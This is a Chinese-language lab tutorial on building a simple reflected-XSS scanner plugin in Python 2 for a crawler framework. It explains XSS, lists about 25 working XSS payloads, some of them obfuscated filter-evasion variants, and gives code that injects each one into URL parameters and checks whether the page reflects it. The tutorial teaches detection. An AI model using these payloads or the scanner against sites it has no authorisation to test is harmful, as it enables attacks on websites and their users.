# 基于爬虫开发XSS检测插件

## 一、实验说明


### 1.1 实验内容
本节课会基于上节课开发的插件框架，讲解xss漏洞形成的原理，据此编写一个简单的XSS检测插件，先上效果图。
![xss插件效果图](https://dn-anything-about-doc.qbox.me/document-uid102428labid2648timestamp1489725913410.png/wm)


### 1.2 实验知识点 

+ XSS基础知识
+ XSS检测原理

### 1.3 实验环境
- Python 2.7
- Xfce终端
- sublime 

### 1.4 适合人群
本课程难度为一般，属于中级级别课程，适合具有Python基础的用户，熟悉python基础知识加深巩固。

### 1.5 代码获取

你可以通过下面命令将代码下载到实验楼环境中，作为参照对比进行学习。
```bash
$ wget http://labfile.oss.aliyuncs.com/courses/761/shiyanlouscan3.zip
$ unzip shiyanlouscan3.zip
```


## 二、开发准备
### xss攻击原理

#### 什么是XSS
> 跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。  

#### 为什么要打造这个检测程序？
1. XSS很少有自动化工具可以对其进行攻击检测
2. 很难发现

#### 敲黑板！！
但是大家不要高兴的太早，我们这篇xss检测程序是很原始很初级的自动化检测，只能检测一部分xss漏洞，但没关系，我们先做出雏形，在后期维护的时候慢慢增强这个功能。

## 三、实验步骤

### 3.1 上节回顾
在上节课中，我们基于爬虫系统开发出了插件系统，这个系统会非常方便的把爬取出来的链接传递到插件系统中，·还记得怎么编写吗？我们只需要一个框架：
```python
import re,random
from lib.core import Download
class spider:
    def run(self,url,html):
         pass
```
然后将运行函数写到run函数里面就可以了,url,html是插件系统传递过来的链接和链接的网页源码。

### 3.2  XSS检测原理：
我们这里先做个很简单的xss原理检测工具，也很简单，就是通过一些xss的payload加入到url参数中，然后查找url的源码中是否存在这个参数，存在则可以证明页面存在xss漏洞了。  

payload list:
```html
</script>"><script>prompt(1)</script>
</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
"><img src=x onerror=prompt(1)>
"><svg/onload=prompt(1)>
"><iframe/src=javascript:prompt(1)>
"><h1 onclick=prompt(1)>Clickme</h1>
"><a href=javascript:prompt(1)>Clickme</a>
"><a href="javascript:confirm%28 1%29">Clickme</a>
"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
"><textarea autofocus onfocus=prompt(1)>
"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
"><script>co\u006efir\u006d`1`</script>
"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
"><img src=x onerror=co\u006efir\u006d`1`>
"><svg/onload=co\u006efir\u006d`1`>
"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
"><a href=javascript:prompt%28 1%29>Clickme</a>
"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
"><textarea autofocus onfocus=co\u006efir\u006d(1)>
"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
"><img/src=x%0Aonerror=prompt`1`>
"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
```
### 3.3 可能大家会问为什么这样就可以检测xss
答：xss原理是把输入的代码当作html执行了，执行了就会在网页源码中显示，所以我们查找就行。

### 3.4 xss就这么简单？
错，xss有各种各样的玩法，本文只是一个简单的工具，用作抛砖引玉。

### 3.5 代码编写
为了以后代码编写的方便，我们编写一个函数取出url中的参数，
比如`https://www.shiyanlou.com/courses/?a=1&b=2&c=3` 。 
我们要将 1 2 3 都取出来进行替换，所以我们先创建一个公共函数来分割这些文本。  

在文件 `lib/core/common.py` 中
```python
def urlsplit(url):
    domain = url.split("?")[0]
    _url = url.split("?")[-1]
    pararm = {}
    for val in _url.split("&"):
        pararm[val.split("=")[0]] = val.split("=")[-1]

    #combine
    urls = []
    for val in pararm.values():
        new_url = domain + '?' + _url.replace(val,'my_Payload')
        urls.append(new_url)
    return urls
```
这个函数会返回一个元祖将每个参数用my_Payload标记，到时候我们替换这个参数就行了。

然后编写我们的xss检查程序，这个程序也是一个基于爬虫的框架。

### 3.6 开始之前
开始之前现在目录新建一个data文件夹，这个文件夹用于存储我们的一些数据。
然后把xss payload放入进入，命名的话随意，这里我就命名为xss.txt，  内容为之前的xss payload list。

### 3.7 xss检测程序代码
在`script`目录下新建文件`xss_check.py`。
代码如下：
```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

from lib.core import Download,common
import sys,os

payload = []
filename = os.path.join(sys.path[0],"data","xss.txt")
f = open(filename)
for i in f:
    payload.append(i.strip())

class spider():
    def run(self,url,html):
        download = Download.Downloader()
        urls = common.urlsplit(url)
        
        if urls is None:
            return False
        for _urlp in urls:
            for _payload in payload:
                _url = _urlp.replace("my_Payload",_payload)
                print "[xss test]:",_url
                #我们需要对URL每个参数进行拆分,测试
                _str = download.get(_url)
                if _str is None:
                    return False
                if(_str.find(_payload)!=-1):
                    print "xss found:%s"%url
        return False
```
效果图：

![此处输入图片的描述](https://dn-anything-about-doc.qbox.me/document-uid102428labid2648timestamp1489725902024.png/wm)

```python
payload = []
filename = os.path.join(sys.path[0],"data","xss.txt")
f = open(filename)
for i in f:
    payload.append(i.strip())
```
这行代码主要实现了读取我们的xsspayload文件。  

因为文件是在windows下生成的，所以我们要对每行用`strip()`过滤下`\n` `空格`等的特殊符号。接下来的代码就是xss检测的运行流程了，获取到url，拆分url，对每个url拆分参数进入注入分析，成功就返回出来。一个很简单的思路。

![此处输入图片的描述](https://dn-anything-about-doc.qbox.me/document-uid102428labid2648timestamp1489726069536.png/wm)

